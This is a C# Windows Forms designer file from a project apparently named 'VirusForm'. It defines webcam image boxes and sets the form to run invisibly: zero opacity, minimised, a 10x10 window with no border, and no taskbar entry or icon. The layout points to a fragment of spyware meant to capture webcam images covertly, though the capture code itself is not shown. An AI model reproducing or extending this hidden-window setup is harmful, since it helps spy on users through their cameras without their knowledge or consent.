namespace VirusForm
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.pbImageFromCam = new System.Windows.Forms.PictureBox();
            this.pbImgCapture = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.pbImageFromCam)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pbImgCapture)).BeginInit();
            this.SuspendLayout();
            // 
            // pbImageFromCam
            // 
            this.pbImageFromCam.Location = new System.Drawing.Point(0, 2);
            this.pbImageFromCam.Name = "pbImageFromCam";
            this.pbImageFromCam.Size = new System.Drawing.Size(471, 393);
            this.pbImageFromCam.TabIndex = 0;
            this.pbImageFromCam.TabStop = false;
            this.pbImageFromCam.Paint += new System.Windows.Forms.PaintEventHandler(this.pbImageFromCam_Paint);
            // 
            // pbImgCapture
            // 
            this.pbImgCapture.Location = new System.Drawing.Point(468, 2);
            this.pbImgCapture.Name = "pbImgCapture";
            this.pbImgCapture.Size = new System.Drawing.Size(507, 393);
            this.pbImgCapture.TabIndex = 2;
            this.pbImgCapture.TabStop = false;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(10, 10);
            this.Controls.Add(this.pbImgCapture);
            this.Controls.Add(this.pbImageFromCam);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Form1";
            this.Opacity = 0D;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "Form1";
            this.WindowState = System.Windows.Forms.FormWindowState.Minimized;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pbImageFromCam)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pbImgCapture)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.PictureBox pbImageFromCam;
        private System.Windows.Forms.PictureBox pbImgCapture;
       
    }
}

